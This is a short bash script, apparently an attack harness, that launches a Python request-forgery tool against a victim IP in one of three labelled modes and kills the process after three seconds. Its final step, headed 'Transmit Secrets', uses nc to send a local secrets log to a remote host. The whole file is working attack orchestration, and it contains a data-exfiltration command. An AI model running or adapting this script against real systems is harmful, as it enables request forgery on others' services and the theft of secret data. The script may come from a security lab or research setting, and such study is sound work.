#!/bin/bash


VICTIM_IP="192.168.79.136"
VICTIM_PORT=12345
TARGET_IP="123.123.123.123"
TARGET_PORT=1337

#Execute Attack

#CMRF
#python3 request_forgery.py cm -v $VICTIM_PORT -t $TARGET_PORT $VICTIM_IP $TARGET_IP &

#SIRF
python3 request_forgery.py si -v $VICTIM_PORT -t $TARGET_PORT $VICTIM_IP $TARGET_IP &

#VNRF
#python3 request_forgery.py vn -v $VICTIM_PORT -t $TARGET_PORT $VICTIM_IP $TARGET_IP &

#Terminate Attack Script

sleep 3
pkill -P $$
#PID=$!
#sleep 10
#kill $PID

#Transmit Secrets

nc $VICTIM_IP 2345 < secrets/secrets.log
